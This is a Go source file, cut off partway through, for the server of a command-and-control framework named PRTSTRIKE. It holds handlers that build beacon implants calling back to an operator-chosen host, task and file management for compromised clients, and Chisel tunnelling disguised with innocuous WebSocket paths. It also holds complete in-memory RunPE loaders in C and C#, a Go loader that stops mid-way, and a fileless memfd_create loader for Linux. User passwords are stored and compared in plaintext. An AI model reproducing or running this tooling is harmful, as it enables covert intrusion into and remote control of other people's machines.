		NewPassword string `json:"new_password" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	session := sessions.Default(c)
	username := session.Get("user")
	if username == nil {
		c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "NOT_LOGGED_IN"})
		return
	}

	var user User
	if err := db.Where("username = ? AND password = ?", username, req.OldPassword).First(&user).Error; err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "OLD_PASSWORD_INCORRECT"})
		return
	}

	user.Password = req.NewPassword
	db.Save(&user)

	addLog("SEC", fmt.Sprintf("PASSWORD_CHANGED: %s", username))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "PASSWORD_CHANGED"})
}

// --- Payload Handlers ---

func handleGetPayloads(c *gin.Context) {
	var list []Payload
	db.Order("created_at desc").Find(&list)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: list})
}

func handleDeletePayload(c *gin.Context) {
	id := c.Param("id")
	var payload Payload
	if err := db.First(&payload, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
		return
	}

	// Remove file
	filePath := "." + payload.DownloadURL
	os.Remove(filePath)

	db.Delete(&Payload{}, "id = ?", id)
	addLog("GEN", "PAYLOAD_DELETED: "+id)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "PAYLOAD_DELETED"})
}

func handleGeneratePayload(c *gin.Context) {
	var req struct {
		Name         string `json:"name" binding:"required"`
		Type         string `json:"type" binding:"required"`
		ListenerID   string `json:"listener_id" binding:"required"`
		CallbackHost string `json:"callback_host" binding:"required"`
		CallbackPort int    `json:"callback_port"`
		OS           string `json:"os"`
		Arch         string `json:"arch"`
		Sleep        int    `json:"sleep"`
		Jitter       int    `json:"jitter"`
		AllowedIPs   string `json:"allowed_ips"`
		BlockedIPs   string `json:"blocked_ips"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	var listener Listener
	if err := db.First(&listener, "id = ?", req.ListenerID).Error; err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "LISTENER_NOT_FOUND"})
		return
	}

	// Callback host: the IP/domain the beacon connects back to
	// Callback port: override port (for NAT/redirect), defaults to listener port
	c2Host := req.CallbackHost
	c2Port := req.CallbackPort
	if c2Port <= 0 {
		c2Port = listener.Port
	}

	proto := "http"
	c2URL := fmt.Sprintf("http://%s:%d", c2Host, c2Port)
	if listener.Type == "reverse_tcp" {
		proto = "tcp"
		c2URL = fmt.Sprintf("%s:%d", c2Host, c2Port)
	}

	sleepVal := req.Sleep
	if sleepVal <= 0 {
		sleepVal = 60
	}
	jitterVal := req.Jitter
	if jitterVal <= 0 {
		jitterVal = 10
	}

	if req.OS == "" {
		req.OS = "windows"
	}
	if req.Arch == "" {
		req.Arch = "amd64"
	}

	// Force OS for platform-specific types
	switch req.Type {
	case "powershell":
		req.OS = "windows"
	case "bash":
		req.OS = "linux"
	}

	newID := "P-" + uuid.New().String()[:8]
	beaconID := uuid.New().String()

	// Prepare IP filter values (use | separator for ldflags compatibility)
	allowedIPs := strings.ReplaceAll(strings.TrimSpace(req.AllowedIPs), ",", "|")
	blockedIPs := strings.ReplaceAll(strings.TrimSpace(req.BlockedIPs), ",", "|")

	// Determine file extension
	ext := ""
	switch req.Type {
	case "executable":
		if req.OS == "linux" {
			ext = "elf"
		} else {
			ext = "exe"
		}
	case "powershell":
		ext = "ps1"
	case "shellcode_bin":
		ext = "bin"
	case "shellcode_raw":
		ext = "raw"
	case "python":
		ext = "py"
	case "bash":
		ext = "sh"
	case "shellcode_c":
		ext = "c"
	case "shellcode_csharp":
		ext = "cs"
	case "shellcode_go":
		ext = "go"
	default:
		ext = "bin"
	}

	dstDir := "./static/payloads"
	if _, err := os.Stat(dstDir); os.IsNotExist(err) {
		os.MkdirAll(dstDir, 0755)
	}
	dstFile := filepath.Join(dstDir, fmt.Sprintf("%s.%s", newID, ext))

	// --- Generate payload based on type ---
	switch req.Type {

	case "powershell":
		if proto == "tcp" {
			c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "PowerShell stager does not support TCP protocol. Use HTTP listener."})
			return
		}
		if err := generateFromTemplate("implants/beacon.ps1", dstFile, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
			addLog("ERR", "PS1_GEN_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}

	case "python":
		if err := generateFromTemplate("implants/beacon.py", dstFile, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
			addLog("ERR", "PYTHON_GEN_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}

	case "bash":
		if err := generateFromTemplate("implants/beacon.sh", dstFile, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
			addLog("ERR", "BASH_GEN_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}

	case "executable":
		if err := buildGoImplant(dstFile, req.OS, req.Arch, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
			addLog("ERR", "BUILD_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}

	case "shellcode_bin", "shellcode_raw":
		// Build Go implant to temp PE/ELF, then export raw bytes
		tmpExtSC := ""
		if req.OS == "windows" {
			tmpExtSC = ".exe"
		}
		tmpFileSC := filepath.Join(dstDir, fmt.Sprintf("%s_tmp%s", newID, tmpExtSC))

		if err := buildGoImplant(tmpFileSC, req.OS, req.Arch, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
			addLog("ERR", "SHELLCODE_BUILD_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}
		defer os.Remove(tmpFileSC)

		rawBytes, err := os.ReadFile(tmpFileSC)
		if err != nil {
			addLog("ERR", "SHELLCODE_READ_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "SHELLCODE_READ_FAILED"})
			return
		}
		if err := os.WriteFile(dstFile, rawBytes, 0644); err != nil {
			addLog("ERR", "SHELLCODE_WRITE_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "SHELLCODE_WRITE_FAILED"})
			return
		}
		addLog("GEN", fmt.Sprintf("RAW_PE_EXPORTED: arch=%s size=%d", req.Arch, len(rawBytes)))

	case "shellcode_c", "shellcode_csharp", "shellcode_go":
		// Build Go implant, embed PE bytes + RunPE loader into source code
		tmpExtEmbed := ""
		if req.OS == "windows" {
			tmpExtEmbed = ".exe"
		}
		tmpFileEmbed := filepath.Join(dstDir, fmt.Sprintf("%s_tmp%s", newID, tmpExtEmbed))

		if err := buildGoImplant(tmpFileEmbed, req.OS, req.Arch, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
			addLog("ERR", "SHELLCODE_EMBED_BUILD_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}
		defer os.Remove(tmpFileEmbed)

		peBytes, errPE := os.ReadFile(tmpFileEmbed)
		if errPE != nil {
			addLog("ERR", "PE_READ_FAILED: "+errPE.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "PE_READ_FAILED"})
			return
		}

		var sourceCode string
		switch req.Type {
		case "shellcode_c":
			sourceCode = generateCLoader(peBytes, req.OS)
		case "shellcode_csharp":
			sourceCode = generateCSharpLoader(peBytes)
		case "shellcode_go":
			sourceCode = generateGoLoader(peBytes)
		}

		if errW := os.WriteFile(dstFile, []byte(sourceCode), 0644); errW != nil {
			addLog("ERR", "SHELLCODE_EMBED_WRITE_FAILED: "+errW.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "WRITE_FAILED"})
			return
		}

		addLog("GEN", fmt.Sprintf("PE_EMBED_GENERATED: type=%s arch=%s peSize=%d", req.Type, req.Arch, len(peBytes)))

	default:
		stubContent := fmt.Sprintf("PRTSTRIKE_PAYLOAD_STUB_%s\nLISTENER:%s\nTYPE:%s", newID, req.ListenerID, req.Type)
		os.WriteFile(dstFile, []byte(stubContent), 0644)
	}

	// Get file size
	var fileSize int64
	if fi, err := os.Stat(dstFile); err == nil {
		fileSize = fi.Size()
	}

	p := &Payload{
		ID:          newID,
		Name:        req.Name,
		Type:        req.Type,
		OS:          req.OS,
		Arch:        req.Arch,
		FileSize:    fileSize,
		ListenerID:  req.ListenerID,
		CreatedAt:   time.Now(),
		DownloadURL: "/static/payloads/" + newID + "." + ext,
	}

	if err := db.Create(p).Error; err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	addLog("GEN", fmt.Sprintf("ARTIFACT_GENERATED: %s [%s/%s/%s] %d bytes", req.Name, req.Type, req.OS, req.Arch, fileSize))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "ARTIFACT_GENERATED", Data: p})
}

// generateFromTemplate reads a template file and replaces placeholders
func generateFromTemplate(tmplPath, dstFile, c2URL, beaconID string, sleep, jitter int, proto, allowedIPs, blockedIPs string) error {
	content, err := os.ReadFile(tmplPath)
	if err != nil {
		return fmt.Errorf("TEMPLATE_NOT_FOUND: %s", tmplPath)
	}
	script := string(content)
	script = strings.ReplaceAll(script, "{{C2_URL}}", c2URL)
	script = strings.ReplaceAll(script, "{{BEACON_ID}}", beaconID)
	script = strings.ReplaceAll(script, "{{SLEEP}}", strconv.Itoa(sleep))
	script = strings.ReplaceAll(script, "{{JITTER}}", strconv.Itoa(jitter))
	script = strings.ReplaceAll(script, "{{PROTO}}", proto)
	script = strings.ReplaceAll(script, "{{ALLOWED_IPS}}", allowedIPs)
	script = strings.ReplaceAll(script, "{{BLOCKED_IPS}}", blockedIPs)
	return os.WriteFile(dstFile, []byte(script), 0644)
}

// buildGoImplant compiles the Go implant for the specified OS/Arch
func buildGoImplant(dstFile, targetOS, targetArch, c2URL, beaconID string, sleep, jitter int, proto, allowedIPs, blockedIPs string) error {
	srcDir := "implants"
	if _, err := os.Stat(filepath.Join(srcDir, "main.go")); os.IsNotExist(err) {
		return fmt.Errorf("SOURCE_NOT_FOUND")
	}

	absDst, _ := filepath.Abs(dstFile)

	// Build ldflags: strip symbols + inject config
	// -H windowsgui: Windows GUI subsystem (no console window)
	ldflagsBase := "-s -w"
	if targetOS == "windows" || (targetOS == "" && runtime.GOOS == "windows") {
		ldflagsBase = "-s -w -H windowsgui"
	}
	ldflags := fmt.Sprintf("%s -X main.C2_URL=%s -X main.BEACON_ID=%s -X main.SLEEP_INTERVAL=%d -X main.JITTER=%d -X main.PROTO=%s -X main.ALLOWED_IPS=%s -X main.BLOCKED_IPS=%s",
		ldflagsBase, c2URL, beaconID, sleep, jitter, proto, allowedIPs, blockedIPs)

	cmd := exec.Command("go", "build",
		"-trimpath",
		"-ldflags", ldflags,
		"-o", absDst, ".")
	cmd.Dir = srcDir
	cmd.Env = os.Environ()
	// Disable CGO for smaller static binary and cross-compilation
	cmd.Env = append(cmd.Env, "CGO_ENABLED=0")
	if targetOS != "" {
		cmd.Env = append(cmd.Env, "GOOS="+targetOS)
	}
	if targetArch != "" {
		cmd.Env = append(cmd.Env, "GOARCH="+targetArch)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("BUILD_FAILED: %s", string(output))
	}

	return nil
}

// --- Task Handlers ---

func handleGetTasks(c *gin.Context) {
	clientID := c.Query("client_id")
	status := c.Query("status")
	var taskList []Task

	query := db.Order("created_at desc")
	if clientID != "" {
		query = query.Where("client_id = ?", clientID)
	}
	if status != "" {
		query = query.Where("status = ?", status)
	}
	query.Limit(200).Find(&taskList)

	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: taskList})
}

func handleCreateTask(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id" binding:"required"`
		Command  string `json:"command" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	msg, data, err := processCommand(req.ClientID, req.Command)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: msg, Data: data})
}

// --- File Handlers ---

func handleGetFiles(c *gin.Context) {
	clientID := c.Query("client_id")
	if clientID == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "CLIENT_ID_REQUIRED"})
		return
	}

	path := c.Query("path")
	if path == "" {
		path = "."
	}
	cmd := "__FILELIST__ " + path

	// Check for a recent cached result
	var task Task
	err := db.Where("client_id = ? AND command = ? AND status = ? AND created_at > ?",
		clientID, cmd, "completed", time.Now().Add(-10*time.Minute)).
		Order("created_at desc").First(&task).Error

	if err == nil && task.Result != "" {
		var result map[string]interface{}
		if jsonErr := json.Unmarshal([]byte(task.Result), &result); jsonErr == nil {
			c.JSON(http.StatusOK, APIResponse{Status: "success", Data: result})
			return
		}
	}

	// Queue file list task using the cross-platform __FILELIST__ command
	taskID := "T-" + uuid.New().String()[:8]
	newTask := &Task{
		ID:        taskID,
		ClientID:  clientID,
		Command:   cmd,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	db.Create(newTask)

	c.JSON(http.StatusOK, APIResponse{
		Status:  "success",
		Message: "FILE_LIST_QUEUED",
		Data:    map[string]string{"task_id": taskID},
	})
}

func handleFileUpload(c *gin.Context) {
	clientID := c.PostForm("client_id")
	file, err := c.FormFile("file")

	if clientID == "" || err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "MISSING_PARAMS"})
		return
	}

	// Save file to uploads directory
	uploadDir := "./uploads"
	if _, err := os.Stat(uploadDir); os.IsNotExist(err) {
		os.MkdirAll(uploadDir, 0755)
	}

	dst := filepath.Join(uploadDir, file.Filename)
	if err := c.SaveUploadedFile(file, dst); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "SAVE_FAILED: " + err.Error()})
		return
	}

	addLog("FILE", fmt.Sprintf("FILE_UPLOADED: %s (%d bytes) for %s", file.Filename, file.Size, clientID))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "FILE_UPLOADED", Data: map[string]string{
		"filename": file.Filename,
		"path":     dst,
	}})
}

// --- Proxy Handlers ---

// ============================================================
// Chisel Tunnel Proxy Management
// ============================================================

var (
	chiselProcs   = make(map[string]*exec.Cmd) // proxy ID -> running process
	chiselProcsMu sync.Mutex
)

// randomWsPath generates an innocent-looking WebSocket path to avoid chisel signature
func randomWsPath() string {
	paths := []string{
		"/api/v2/events", "/ws/notifications", "/api/stream",
		"/socket/updates", "/api/health/ws", "/connect/realtime",
		"/api/v1/feed", "/ws/telemetry", "/api/sync",
		"/gateway/ws", "/push/channel", "/api/v3/live",
	}
	return paths[time.Now().UnixNano()%int64(len(paths))]
}

// randomAuthKey generates a random auth key
func randomAuthKey() string {
	b := make([]byte, 16)
	if _, err := io.ReadFull(cryptoRand.Reader, b); err != nil {
		return uuid.New().String()
	}
	return fmt.Sprintf("%x", b)
}

// findChiselBinary locates the chisel binary in tools/
func findChiselBinary() string {
	candidates := []string{
		"tools/chisel.exe", "tools/chisel",
		"chisel.exe", "chisel",
	}
	for _, c := range candidates {
		if _, err := os.Stat(c); err == nil {
			abs, _ := filepath.Abs(c)
			return abs
		}
	}
	return ""
}

// ==================== Shellcode Embed Generators ====================

// formatBytesC formats shellcode bytes as C-style hex array initializer
func formatBytesC(data []byte) string {
	var sb strings.Builder
	for i, b := range data {
		if i > 0 {
			sb.WriteString(", ")
			if i%12 == 0 {
				sb.WriteString("\n    ")
			}
		}
		fmt.Fprintf(&sb, "0x%02x", b)
	}
	return sb.String()
}

// generateCLoader generates a C source file with embedded PE and RunPE loader
func generateCLoader(peBytes []byte, targetOS string) string {
	formatted := formatBytesC(peBytes)

	if targetOS == "linux" {
		return fmt.Sprintf(`/*
 * PRTSTRIKE RunPE Loader (Linux)
 * Embedded ELF size: %d bytes
 *
 * Compile:
 *   gcc -o loader loader.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/stat.h>

#ifndef __NR_memfd_create
#define __NR_memfd_create 319
#endif
#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

unsigned char pe_data[] = {
    %s
};
unsigned int pe_size = sizeof(pe_data);

int main(int argc, char *argv[], char *envp[]) {
    // memfd_create: anonymous in-memory file, no disk touch
    int fd = (int)syscall(__NR_memfd_create, "", MFD_CLOEXEC);
    if (fd < 0) {
        // Fallback: temp file
        char tmp[] = "/tmp/.pXXXXXX";
        fd = mkstemp(tmp);
        write(fd, pe_data, pe_size);
        close(fd);
        chmod(tmp, 0755);
        char *args[] = { tmp, NULL };
        execve(tmp, args, envp);
        unlink(tmp);
        return -1;
    }

    write(fd, pe_data, pe_size);
    char *args[] = { "worker", NULL };
    fexecve(fd, args, envp);
    return -1;
}
`, len(peBytes), formatted)
	}

	// Windows RunPE loader
	return fmt.Sprintf(`/*
 * PRTSTRIKE RunPE Loader (Windows)
 * Embedded PE size: %d bytes
 *
 * Compile (MinGW x64):
 *   x86_64-w64-mingw32-gcc -o loader.exe loader.c -mwindows -lkernel32
 * Compile (MSVC x64):
 *   cl.exe /nologo /O2 loader.c /link /SUBSYSTEM:WINDOWS kernel32.lib
 *
 * NOTE: Compile with the same architecture as the embedded PE.
 */

#include <windows.h>
#include <string.h>

unsigned char pe_data[] = {
    %s
};
unsigned int pe_size = sizeof(pe_data);

int main() {
    /* Parse PE headers */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)pe_data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return -1;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(pe_data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return -1;

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;

    /* Allocate memory for PE image */
    BYTE *base = (BYTE *)VirtualAlloc(
        (LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
        imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) {
        base = (BYTE *)VirtualAlloc(NULL, imageSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (!base) return -1;

    /* Copy PE headers */
    memcpy(base, pe_data, nt->OptionalHeader.SizeOfHeaders);

    /* Re-parse NT headers from mapped image */
    IMAGE_NT_HEADERS *mNT = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

    /* Map sections */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(mNT);
    for (WORD i = 0; i < mNT->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0 && sec[i].PointerToRawData > 0) {
            memcpy(base + sec[i].VirtualAddress,
                   pe_data + sec[i].PointerToRawData,
                   sec[i].SizeOfRawData);
        }
    }

    /* Process base relocations */
    ULONG_PTR delta = (ULONG_PTR)base - (ULONG_PTR)mNT->OptionalHeader.ImageBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY *relocDir =
            &mNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->Size > 0 && relocDir->VirtualAddress > 0) {
            IMAGE_BASE_RELOCATION *reloc =
                (IMAGE_BASE_RELOCATION *)(base + relocDir->VirtualAddress);
            while (reloc->VirtualAddress > 0 && reloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                DWORD cnt = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *entries = (WORD *)((BYTE *)reloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD j = 0; j < cnt; j++) {
                    WORD type = entries[j] >> 12;
                    WORD off  = entries[j] & 0x0FFF;
                    BYTE *patch = base + reloc->VirtualAddress + off;
#ifdef _WIN64
                    if (type == IMAGE_REL_BASED_DIR64)
                        *(ULONGLONG *)patch += (ULONGLONG)delta;
#endif
                    if (type == IMAGE_REL_BASED_HIGHLOW)
                        *(DWORD *)patch += (DWORD)delta;
                }
                reloc = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + reloc->SizeOfBlock);
            }
        }
    }
    mNT->OptionalHeader.ImageBase = (ULONG_PTR)base;

    /* Resolve imports */
    IMAGE_DATA_DIRECTORY *impDir =
        &mNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (impDir->Size > 0 && impDir->VirtualAddress > 0) {
        IMAGE_IMPORT_DESCRIPTOR *imp =
            (IMAGE_IMPORT_DESCRIPTOR *)(base + impDir->VirtualAddress);
        while (imp->Name) {
            HMODULE hDll = LoadLibraryA((char *)(base + imp->Name));
            if (!hDll) { imp++; continue; }

            IMAGE_THUNK_DATA *oThunk = (IMAGE_THUNK_DATA *)(base +
                (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
            IMAGE_THUNK_DATA *fThunk = (IMAGE_THUNK_DATA *)(base + imp->FirstThunk);

            while (oThunk->u1.AddressOfData) {
                if (IMAGE_SNAP_BY_ORDINAL(oThunk->u1.Ordinal)) {
                    fThunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll,
                        MAKEINTRESOURCEA(IMAGE_ORDINAL(oThunk->u1.Ordinal)));
                } else {
                    IMAGE_IMPORT_BY_NAME *hint =
                        (IMAGE_IMPORT_BY_NAME *)(base + oThunk->u1.AddressOfData);
                    fThunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll, hint->Name);
                }
                oThunk++;
                fThunk++;
            }
            imp++;
        }
    }

    /* Set executable permission and flush cache */
    DWORD oldProtect;
    VirtualProtect(base, imageSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    FlushInstructionCache(GetCurrentProcess(), base, imageSize);

    /* Execute entry point in new thread */
    HANDLE hThread = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)(base + mNT->OptionalHeader.AddressOfEntryPoint),
        NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
`, len(peBytes), formatted)
}

// generateCSharpLoader generates a C# source file with embedded PE and RunPE loader (PE32+ / x64)
func generateCSharpLoader(peBytes []byte) string {
	formatted := formatBytesC(peBytes)
	return fmt.Sprintf(`/*
 * PRTSTRIKE RunPE Loader (C# / PE32+ x64)
 * Embedded PE size: %d bytes
 *
 * Compile:
 *   csc /platform:x64 /target:winexe /unsafe /out:loader.exe loader.cs
 */

using System;
using System.Runtime.InteropServices;

namespace PrtsLoader
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr addr, ulong size, uint type, uint protect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr addr, ulong size, uint newProt, out uint oldProt);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr attr, uint stackSz, IntPtr start, IntPtr param, uint flags, IntPtr tid);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr h, uint ms);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibraryA(string name);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr mod, string name);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr mod, IntPtr ordinal);

        [DllImport("kernel32.dll")]
        static extern bool FlushInstructionCache(IntPtr proc, IntPtr addr, ulong size);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static byte[] pe_data = new byte[] {
            %s
        };

        static ushort R16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
        static uint   R32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
        static ulong  R64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }

        static void Main(string[] args)
        {
            int lfanew      = (int)R32(pe_data, 0x3C);
            ushort numSec   = R16(pe_data, lfanew + 0x06);
            ushort optSz    = R16(pe_data, lfanew + 0x14);
            uint entryRVA   = R32(pe_data, lfanew + 0x28);
            ulong imgBase   = R64(pe_data, lfanew + 0x30);
            uint sizeOfImg  = R32(pe_data, lfanew + 0x50);
            uint sizeOfHdr  = R32(pe_data, lfanew + 0x54);

            /* Allocate at preferred base, fallback to any address */
            IntPtr baseAddr = VirtualAlloc((IntPtr)(long)imgBase, sizeOfImg, 0x3000, 0x04);
            if (baseAddr == IntPtr.Zero)
                baseAddr = VirtualAlloc(IntPtr.Zero, sizeOfImg, 0x3000, 0x04);
            if (baseAddr == IntPtr.Zero) return;

            /* Copy headers */
            Marshal.Copy(pe_data, 0, baseAddr, (int)sizeOfHdr);

            /* Map sections */
            int secOff = lfanew + 0x18 + optSz;
            for (int i = 0; i < numSec; i++) {
                int s = secOff + i * 40;
                uint va   = R32(pe_data, s + 12);
                uint rawSz = R32(pe_data, s + 16);
                uint rawPtr = R32(pe_data, s + 20);
                if (rawSz > 0 && rawPtr > 0)
                    Marshal.Copy(pe_data, (int)rawPtr, baseAddr + (int)va, (int)rawSz);
            }

            /* Process relocations */
            long delta = (long)baseAddr - (long)imgBase;
            if (delta != 0) {
                uint relocRVA  = R32(pe_data, lfanew + 0xB0);
                uint relocSize = R32(pe_data, lfanew + 0xB4);
                if (relocSize > 0 && relocRVA > 0) {
                    int off = 0;
                    while (off < (int)relocSize) {
                        uint blkRVA  = (uint)Marshal.ReadInt32(baseAddr + (int)relocRVA + off);
                        uint blkSize = (uint)Marshal.ReadInt32(baseAddr + (int)relocRVA + off + 4);
                        if (blkSize == 0) break;
                        int cnt = (int)(blkSize - 8) / 2;
                        for (int j = 0; j < cnt; j++) {
                            ushort entry = (ushort)Marshal.ReadInt16(baseAddr + (int)relocRVA + off + 8 + j * 2);
                            int tp = entry >> 12;
                            int eo = entry & 0xFFF;
                            IntPtr patch = baseAddr + (int)blkRVA + eo;
                            if (tp == 10)      /* DIR64 */
                                Marshal.WriteInt64(patch, Marshal.ReadInt64(patch) + delta);
                            else if (tp == 3)  /* HIGHLOW */
                                Marshal.WriteInt32(patch, Marshal.ReadInt32(patch) + (int)delta);
                        }
                        off += (int)blkSize;
                    }
                }
            }

            /* Resolve imports */
            uint impRVA  = R32(pe_data, lfanew + 0x90);
            uint impSize = R32(pe_data, lfanew + 0x94);
            if (impSize > 0 && impRVA > 0) {
                int io = 0;
                while (true) {
                    IntPtr id = baseAddr + (int)impRVA + io;
                    uint origFT = (uint)Marshal.ReadInt32(id);
                    uint nameRV = (uint)Marshal.ReadInt32(id + 12);
                    uint firstT = (uint)Marshal.ReadInt32(id + 16);
                    if (nameRV == 0) break;

                    string dll = Marshal.PtrToStringAnsi(baseAddr + (int)nameRV);
                    IntPtr hDll = LoadLibraryA(dll);
                    if (hDll == IntPtr.Zero) { io += 20; continue; }

                    uint tRVA = origFT != 0 ? origFT : firstT;
                    int idx = 0;
                    while (true) {
                        long tv = Marshal.ReadInt64(baseAddr + (int)tRVA + idx * 8);
                        if (tv == 0) break;
                        IntPtr fn;
                        if ((tv & unchecked((long)0x8000000000000000)) != 0)
                            fn = GetProcAddress(hDll, (IntPtr)(tv & 0xFFFF));
                        else {
                            string fname = Marshal.PtrToStringAnsi(baseAddr + (int)tv + 2);
                            fn = GetProcAddress(hDll, fname);
                        }
                        Marshal.WriteInt64(baseAddr + (int)firstT + idx * 8, (long)fn);
                        idx++;
                    }
                    io += 20;
                }
            }

            /* Set executable + flush */
            uint oldProt;
            VirtualProtect(baseAddr, sizeOfImg, 0x40, out oldProt);
            FlushInstructionCache(GetCurrentProcess(), baseAddr, sizeOfImg);

            /* Run entry point */
            IntPtr ep = baseAddr + (int)entryRVA;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, ep, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
`, len(peBytes), formatted)
}

// generateGoLoader generates a Go source file with embedded PE and RunPE loader (PE32+ / x64)
func generateGoLoader(peBytes []byte) string {
	formatted := formatBytesC(peBytes)
	return fmt.Sprintf(`/*
 * PRTSTRIKE RunPE Loader (Go / PE32+ x64)
 * Embedded PE size: %d bytes
 *
 * Compile:
 *   GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui" -o loader.exe loader.go
 */

package main

import (
	"encoding/binary"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT_RESERVE     = 0x3000
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READWRITE = 0x40
	INFINITE               = 0xFFFFFFFF
)

var (
	kernel32        = syscall.NewLazyDLL("kernel32.dll")
	ntdll           = syscall.NewLazyDLL("ntdll.dll")
	pVirtualAlloc   = kernel32.NewProc("VirtualAlloc")
	pVirtualProtect = kernel32.NewProc("VirtualProtect")
	pCreateThread   = kernel32.NewProc("CreateThread")
	pWaitForSingle  = kernel32.NewProc("WaitForSingleObject")
	pLoadLibrary    = kernel32.NewProc("LoadLibraryA")
	pGetProcAddr    = kernel32.NewProc("GetProcAddress")
